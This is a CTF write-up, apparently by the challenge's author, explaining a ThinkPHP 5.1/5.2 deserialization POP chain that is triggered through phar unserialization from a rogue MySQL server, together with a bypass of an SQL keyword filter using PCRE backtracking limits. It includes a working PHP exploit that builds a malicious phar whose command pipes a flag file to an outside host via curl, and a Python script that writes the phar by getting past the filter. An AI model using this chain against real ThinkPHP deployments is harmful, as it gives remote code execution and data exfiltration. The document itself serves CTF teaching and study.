[中文](./README.md) [English](./EN_writeup.md)

### Foreword
The idea of ​​this challenge comes from[TSec 2019 议题 PPT：Comprehensive analysis of the mysql client attack chain](https://paper.seebug.org/998/)，But the core of the investigation is the tp5.2 deserialization vulnerability mining(Expected solution can be broken tp5.1.x and tp5.2.x).

### regular expression back track
This point @PHITHON in `codebreaking` has been out of the problem.
[https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html)

```php
if(preg_match('/sleep|BENCHMARK|processlist|GET_LOCK|information_schema|into.+?outfile|into.+?dumpfile|\/\*.*\*\//is', $query)) {
    die('Go out!!!');
}
```
Using the `select xx into/*(1000000*a)*/dumpfile;`you can pass it.

### Mysql Phar Unserialize
A long time ago, @zsx in the article[Phar与Stream Wrapper造成PHP RCE的深入挖掘](https://xz.aliyun.com/t/2958)that LOCAL mysql could trigger Phar Unserialize
![image.png](./img/1.png)
There is a mention of the local limitations of these two configurations.
```
[mysqld]
local-infile=1
secure_file_priv=""
```
However, it is also limited to `open_basedir`
![image.png](./img/2.png)
Which is actually the reason that using`Rogue Mysql Server`can only read files in `/tmp`.
In addition, the mysql user needs to have `insert` permissions, otherwise an error will be reported. 
Therefore, it is not possible to directly execute `LOAD DATA LOCAL INFILE` in the challenge to trigger phar unserialize.

@LoRexxar' shared topic [https://paper.seebug.org/998/](https://paper.seebug.org/998/) at this year's Tsec. In his topic, he mentioned that `mysql client` can use any file read to do phar unserialize with trick above.The principle is that when `Mysql Client` sends any query statements to `Rogue Mysql Server`, `Rogue Mysql Server` can reply a `file-transfer` request containing the file name it wants to read. And then ask Mysql Client to execute `LOAD DATA LOCAL INFILE `statement to read out the file and send it to Rogue Mysql Server. At the moment, we change the filename format to `phar://filename` and let it execute the `LOAD DATA LOCAL INFILE` statement to trigger phar unserialize.

### Tp5.1.x - 5.2.x deserialization POP chain analysis

The first is the entry point
`think\process\pipes\windows`
![image.png](./img/3.png)

`file_exists` can trigger `__toString` method
![image.png](./img/4.png)

Global search `__toString` method, follow up`think\model\concern\Conversion`
![image.png](./img/5.png)

View its `toJson` method, Continue to follow up `toArray` method。
![image.png](./img/6.png)


Let's take a look `getAttr` method.
![image.png](./img/8.png)
![image.png](./img/9.png)


follow up `getValue`，The vulnerability is here.
![image.png](./img/10.png)
We go back in time`$closure，$value，$this->data`

`$closure = $this->withAttr[$fieldName];`，We can control`$this->withAttr`
`$fieldName = $this->getRealFieldName($name);`
follow up`getRealFieldName`
![image.png](./img/11.png)

`$strict` default is true，so the incoming string will be returned as is.
![image.png](./img/12.png)


Incoming is `$name`，Also a parameter `$key` of `getAttr`，It is also the key name of `$data`. 
`$data` is the result of the combination of `$this->data, $this->relation`, so `$closure` is controllable.
![image.png](./img/13.png)

Look at `$value` and follow up the `getData` method.
![image.png](./img/14.png)

If `$this->data` exists in the `$fieldName` key name, the corresponding key value is returned. According to the above analysis, we can just enter the if, and the return value of `$value` is the corresponding to `$closure`. Key value, so `$value` is also controllable.
![image.png](./img/15.png)

Looking back at the vulnerability point, `$closure, $value` we are all controllable, and `$this->data` is an array we use to control the return value of `$closure, $value`.
![image.png](./img/16.png)

How can we use it at this time?
Example:
![image.png](./img/17.png)


I have not carefully looked for other utilization functions, and interested teachers can look for them.

exp:
This exp is my source of tp5.1 source construction and 5.2 is a bit different, but can be used directly.

```php
<?php
namespace think\process\pipes {
    class Windows
    {
        private $files;
        public function __construct($files)
        {
            $this->files = array($files);
        }
    }
}

namespace think\model\concern {
    trait Conversion
    {
        protected $append = array("Smi1e" => "1");
    }

    trait Attribute
    {
        private $data;
        private $withAttr = array("Smi1e" => "system");

        public function get($system)
        {
            $this->data = array("Smi1e" => "$system");
        }
    }
}
namespace think {
    abstract class Model
    {
        use model\concern\Attribute;
        use model\concern\Conversion;
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model
    {
        public function __construct($system)
        {
            $this->get($system);
        }
    }
}

namespace {
    $Conver = new think\model\Pivot("curl http://vps/ -d '`tac /flag`';");
    $payload = new think\process\pipes\Windows($Conver);
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); //设置stub
    $phar->setMetadata($payload); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
    echo urlencode(serialize($payload));
}
?>
```

### sql_manage
First find the mysql username and password in the source configuration file.
![image.png](./img/18.png)

View writable directory
![image.png](./img/19.png)

Construct a phar file and use regular expression back track to bypass the limit write file

```php
if(preg_match('/sleep|BENCHMARK|processlist|GET_LOCK|information_schema|into.+?outfile|into.+?dumpfile|\/\*.*\*\//is', $query)) {
        die('Go out!!!');
 }
```

```python
#coding=utf-8
import requests
url = "http://47.91.213.248:8001/query"
a = 'a'*1000000
data = {
    "query": "select 0x123456 into/*{}*/dumpfile '/tmp/smi1e123.phar';".format(a),
    "code": "nuk9"
}
cookie = {
    "PHPSESSID":"ik01ngjcquttltalvf7vk6aqap"
}

print(requests.post(url=url,data=data,cookies=cookie).text)
```

`load_file` can see that the write is successful.
![image.png](./img/20.png)

Use this project [https://github.com/Gifts/Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server) 
Change the file name to phar format
![image.png](./img/21.png)

The host is changed to the `Rogue-MySql-Server` host, and the username and password are free.
![image.png](./img/22.png)

The server `nc`, then execute any sql statement to trigger the phar unserialize to receive the flag.
![image.png](./img/23.png)

Afterword
Since it is similar to ByteCTF and TMCTF, there are not many teachers in this problem. I also encountered many problems when I wrote the question. Although this topic is not very good, I still want to say it is not easy. So I hope the teachers take it seriously.